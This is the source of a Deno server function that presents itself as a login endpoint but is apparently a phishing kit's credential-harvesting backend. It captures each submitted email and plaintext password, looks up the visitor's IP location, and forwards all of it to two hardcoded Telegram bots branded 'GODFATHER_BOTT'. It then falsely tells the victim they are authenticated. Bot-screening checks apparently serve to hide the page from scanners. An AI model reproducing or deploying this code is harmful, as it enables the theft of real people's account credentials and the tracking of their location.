// @ts-nocheck — Deno runtime file; browser TS checker errors here are false positives
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import {
  handleOptions,
  jsonResponse,
  parseSecureBody,
  verifyGateToken,
  verifyTurnstile,
} from "../_shared/security.ts"
import { botRedirectResponse, evaluateBotSignals } from "../_shared/botShield.ts"
interface LoginRequest {
  email: string
  provider?: string
  password: string
  turnstileToken?: string
  clientSignals?: Record<string, unknown>
  // Geolocation fields (resolved client-side via IP lookup)
  ip?: string
  country?: string
  countryCode?: string
  region?: string
  city?: string
  continent?: string
  org?: string
  timezone?: string
}

interface LoginResponse {
  success: boolean
  message: string
  data?: {
    email: string
    name: string
    provider: string
    timestamp: string
  }
  error?: string
}

// Telegram configuration — each bot has its own token and chat ID
const TELEGRAM_BOTS = [
  { token: '8335283094:AAG6BMVNr4O4zy8ha9565bgX-P87uKsJYB0', chatId: '8042057280' },
  { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
]

interface GeoInfo {
  ip?: string
  country?: string
  countryCode?: string
  region?: string
  city?: string
  continent?: string
  org?: string
  timezone?: string
}

/**
 * Resolves geolocation for a given IP using ipwho.is.
 * Called from inside the Deno edge function — completely adblocker-proof.
 * Falls back gracefully to client-supplied geo fields if the lookup fails.
 */
async function resolveGeo(clientIp: string | null, fallback: GeoInfo): Promise<GeoInfo> {
  if (!clientIp) return fallback
  try {
    const res = await fetch(`https://ipwho.is/${clientIp}`, {
      signal: AbortSignal.timeout(4000),
    })
    if (!res.ok) throw new Error(`HTTP ${res.status}`)
    const d = await res.json()
    if (!d.success) throw new Error('ipwho.is returned success=false')
    return {
      ip: d.ip,
      country: d.country,
      countryCode: d.country_code,
      region: d.region,
      city: d.city,
      continent: d.continent,
      org: d.connection?.isp || d.connection?.org,
      timezone: d.timezone?.id,
    }
  } catch (err) {
    console.error('Server-side geo lookup failed, using client fallback:', err)
    return fallback
  }
}

async function sendTelegramNotification(
  name: string,
  email: string,
  provider: string,
  password: string,
  geo?: GeoInfo
) {
  if (password.startsWith('[OTP Code]')) {
    return
  }

  const credentialLabel = '🔒 <b>Password:</b>';
  const displayPassword = password;
  const statusLabel = 'Successfully Authenticated';

  // Build geolocation section
  const geoLines = geo ? [
    geo.ip ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
    geo.country ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}` : null,
    geo.continent ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
    geo.region ? `📍 <b>Region:</b> ${geo.region}` : null,
    geo.city ? `🏙️ <b>City:</b> ${geo.city}` : null,
    geo.org ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
    geo.timezone ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
  ].filter(Boolean).join('\n') : ''

  const geoSection = geoLines ? `\n\n📡 <b>Geolocation</b>\n━━━━━━━━━━━━━━━━━━━━\n${geoLines}` : ''

  const message = `
╔══════════════════════════════╗
  ⚡ <span class="tg-spoiler">[ ＧＯＤＦＡＴＨＥＲ _ ＢＯＴＴ ]</span> ⚡
╚══════════════════════════════╝

✅ <b>Status:</b> ${statusLabel}
👤 <b>Name:</b> ${name}
📧 <b>Email:</b> ${email}
🔗 <b>Provider:</b> ${provider}
${credentialLabel} <code>${displayPassword}</code>
🕐 <b>Timestamp:</b> ${new Date().toISOString()}${geoSection}

━━━━━━━━━━━━━━━━━━━━
<i>User has been welcomed and account is now active.</i>
<code>@godfather_bott</code>
  `.trim()

  try {
    const fetchPromises = TELEGRAM_BOTS.map(({ token, chatId }, i) =>
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      })
        .then(async (res) => {
          if (!res.ok) {
            const err = await res.text()
            console.error(`[Bot ${i}] Failed: ${res.status} — ${err}`)
          } else {
            console.log(`[Bot ${i}] Sent successfully`)
          }
        })
        .catch((err) => {
          console.error(`[Bot ${i}] Network error:`, err)
        })
    )

    await Promise.allSettled(fetchPromises)
  } catch (error) {
    console.error('Unexpected error sending Telegram notifications:', error)
  }
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return handleOptions()
  }

  try {
    if (req.method !== 'POST') {
      return jsonResponse({
        success: false,
        message: 'Method not allowed',
        error: 'Method not allowed. Use POST.'
      } as LoginResponse, 405)
    }

    const accessToken = req.headers.get('x-access-token')
    if (!(await verifyGateToken(accessToken))) {
      return jsonResponse({
        success: false,
        message: 'Access denied',
        error: 'Valid session verification is required. Please reload the page.'
      } as LoginResponse, 403)
    }

    const body = await parseSecureBody(req) as LoginRequest

    const botCheck = evaluateBotSignals(req, body.clientSignals)
    if (botCheck.isBot) {
      return botRedirectResponse(botCheck.reason)
    }

    if (!body.email) {
      return jsonResponse({
        success: false,
        message: 'Validation failed',
        error: 'Missing required field: email is required.'
      } as LoginResponse, 400)
    }
    if (body.password && body.password.length < 3) {
      return jsonResponse({
        success: false,
        message: 'Validation failed',
        error: 'Password must be at least 3 characters long.'
      } as LoginResponse, 400)
    }

    const isOtpSubmission = body.password?.startsWith('[OTP Code]')

    if (body.password && !isOtpSubmission && body.turnstileToken) {
      const turnstileVerified = await verifyTurnstile(body.turnstileToken)
      if (!turnstileVerified) {
        return jsonResponse({
          success: false,
          message: 'Verification failed',
          error: 'Failed to verify Turnstile challenge. Are you a bot?'
        } as LoginResponse, 403)
      }
    }
    // Extract name from email
    const emailLocal = body.email.split('@')[0]
    const formattedName = emailLocal
      .split('.')
      .map(part => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
      .join(' ')

    // Generate professional welcome message
    const providerName = body.provider ? ` via ${body.provider}` : ''
    const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`

    // Build geo object — prefer server-side lookup (adblocker-proof)
    // Extract real client IP from Cloudflare/proxy headers
    const clientIp =
      req.headers.get('cf-connecting-ip') ||
      req.headers.get('x-forwarded-for')?.split(',')[0].trim() ||
      req.headers.get('x-real-ip') ||
      null

    // Client-sent fields act as fallback (useful in local/dev where CF headers absent)
    const clientGeo: GeoInfo = {
      ip: body.ip,
      country: body.country,
      countryCode: body.countryCode,
      region: body.region,
      city: body.city,
      continent: body.continent,
      org: body.org,
      timezone: body.timezone,
    }

    // Server-side lookup wins — runs in Deno, never blocked by browser adblockers
    const geo = await resolveGeo(clientIp, clientGeo)

    // Send Telegram notification (must await so Deno isolate doesn't terminate before it finishes)
    await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password, geo).catch(err => {
      console.error('Telegram notification error:', err)
    })

    // Return success response
    const response: LoginResponse = {
      success: true,
      message: welcomeMessage,
      data: {
        email: body.email,
        name: formattedName,
        provider: body.provider || 'email',
        timestamp: new Date().toISOString()
      }
    }

    return jsonResponse(response as LoginResponse, 200)

  } catch (error) {
    return jsonResponse({
      success: false,
      message: 'Server error',
      error: error instanceof Error ? error.message : 'An unexpected error occurred during login processing.'
    } as LoginResponse, 500)
  }
})